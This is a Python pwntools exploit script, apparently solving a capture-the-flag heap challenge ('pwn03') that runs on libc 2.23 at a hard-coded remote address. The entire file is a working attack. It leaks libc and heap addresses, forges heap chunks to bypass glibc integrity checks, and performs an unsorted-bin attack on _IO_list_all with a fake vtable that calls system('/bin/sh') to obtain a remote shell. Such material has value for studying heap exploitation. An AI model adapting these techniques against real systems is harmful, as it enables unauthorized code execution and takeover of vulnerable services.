#!/usr/bin/env python
from pwn import *
import sys

HOST = '18.136.126.78'
PORT = 1336

def info(s):
	log.info(s)

def alloc():
	p.sendlineafter("YOUR CHOICE : ","1")

def edit(idx,d,s):
	p.sendlineafter("YOUR CHOICE : ","2")
	p.sendlineafter("Index : ",str(idx))
	p.sendlineafter("Magic : ",str(d))
	p.sendlineafter("Content : ",s)

def delete(idx):
	p.sendlineafter("YOUR CHOICE : ","3")
	p.sendlineafter("Index : ",str(idx))

def show(idx):
	p.sendlineafter("YOUR CHOICE : ","4")
	p.sendlineafter("Index : ",str(idx))

def exploit(p):
	alloc() 	# 0
	alloc() 	# 1
	alloc()		# 2
	alloc()		# 3
	# leak heap address and libc
	delete(0)	
	delete(2)
	alloc()		# 0
	show(0)
	libc=ELF("./libc-2.23.so")
	p.recvuntil("Magic : ")
	# address main_arena+88=__malloc_hook+0x68 at fd
	leak=eval(p.recvline())
	base=leak-libc.symbols['__malloc_hook']-0x68
	main_arena=base+libc.symbols['__malloc_hook']+0x10
	info("main_arena at 0x%x"%main_arena)
	info("base is 0x%x"%base)
	p.recvuntil("Content : ")
	# address of chunk #2 at bk
	heap=u64(p.recv(6).ljust(8,'\x00'))-0x140
	info("heap is 0x%x"%heap)
	alloc() 	# 2
	edit(1,heap+0x1e0,'a'*8) # fake chunk to bypass check fd->BK=P && bk->FD=P
	# heap+0x1e0 = chunk #3
	# fake pre_size of topchunk and off by null to make #3 free
	# fake fd and bk of #3 to bypass above condition
	# heap+0xb0 is buf of chunk #1
	edit(3,heap+0xb0-0x18,p64(heap+0xb0-0x10).ljust(0x90-8,'\x00')+p64(0xa0))
	# overlap chunk, chunk #2 merge topchunk, while chunk #3 inuse
	delete(2)
	alloc()		# 2
	# fake bk of #3, heap+0xb0 is header of chunk want to malloc return
	edit(3,0,p64(heap+0xb0))
	alloc()		# 4 duplicate with chunk #3
	'''0x555555756040 <letters>:	0x0000555555757010	0x00005555557570b0
	0x555555756050 <letters+16>:	0x0000555555757150	0x00005555557571f0
	0x555555756060 <letters+32>:	0x00005555557571f0	0x0000000000000000'''
	# set size eqal 0xa0 to malloc return address above, set bk = main_arena+88 to bypass check
	edit(1,0,p64(0xa1)+p64(0)+p64(main_arena+88))
	alloc()		# 5
	'''0x555555756040 <letters>:	0x0000555555757010	0x00005555557570b0
	0x555555756050 <letters+16>:	0x0000555555757150	0x00005555557571f0
	0x555555756060 <letters+32>:	0x00005555557571f0	0x00005555557570c0'''
	# fake next chunk #5 to free #5
	edit(2, 0, p64(0x21) + p64(0) * 3 + p64(0x21))
	delete(5)
	io_list_all=base+libc.symbols['_IO_list_all']
	fake_vtable = heap + 0x1a8 # *vtable
	info("io 0x%x\njump 0x%x"%(io_list_all,fake_vtable))
	# set size smallbin 0x60 and unsortbin attack _IO_list_all
	payload = p64(0x61) + p64(0) + p64(io_list_all - 0x10)
	# bypass check [rbx+0x20] < [rbx+0x28]
	payload += p64(1) + p64(2)
	# fd of chunk #1 is rbx, header of chunk #5, and arg of fake _IO_overflow function
	edit(1, u64('/bin/sh\x00'), payload)
	# vtable = [rbx+0xd8]
	payload = p64(0) * 6 # padding
	payload += p64(fake_vtable) # at $rbx+0xd8
	payload += p64(0) * 6	# padding to _IO_overflow
	payload += p64(base+libc.symbols['system']) # fake _IO_overflow
	edit(2, 0, payload)
	alloc()		# trigger memory corupption
	p.interactive()
	return

if __name__=="__main__":

	if len(sys.argv)<2:
		p=process('./pwn03')
		print util.proc.pidof(p)
		pause()
		exploit(p)

	else:
		p=remote(HOST,PORT)
		exploit(p)
